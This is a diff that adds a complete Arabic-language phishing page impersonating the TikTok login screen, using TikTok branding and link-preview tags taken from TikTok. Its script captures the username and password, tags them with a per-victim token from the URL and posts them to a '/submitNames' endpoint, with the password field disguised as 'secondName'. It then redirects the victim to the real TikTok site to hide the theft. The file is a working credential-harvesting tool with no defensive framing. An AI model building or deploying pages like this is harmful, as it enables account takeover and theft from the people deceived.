@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Meta Tags for Preview -->
+    <meta property="og:title" content="TikTok - شاهد مقاطع الفيديو الرائجة">
+    <meta property="og:description" content="انضم إلى الملايين من المشاهدين الذين يكتشفون المحتوى المبدع على تيك توك.">
+    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efc5601ff3.png">
+    <meta property="og:type" content="video.other">
+
+    <title>TikTok</title>
+    <style>
+        body { font-family: 'TikTokFont', Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { width: 400px; padding: 30px; border: 1px solid #ebebeb; text-align: center; border-radius: 8px; }
+        .logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; color: #000; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #f1f1f2; background: #f1f1f2; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #fe2c55; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">TikTok</div>
+        <h3>تسجيل الدخول</h3>
+        <form id="tiktokForm">
+            <input type="text" id="user" placeholder="اسم المستخدم" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" id="tBtn">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('t');
+
+        document.getElementById('tiktokForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('tBtn');
+            btn.disabled = true;
+            btn.innerText = "جاري التحميل...";
+
+            try {
+                await fetch('/submitNames', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        firstName: document.getElementById('user').value,
+                        secondName: document.getElementById('pass').value
+                    })
+                });
+            } catch (err) {}
+
+            window.location.href = "https://www.tiktok.com";
+        };
+    </script>
+</body>
+</html>
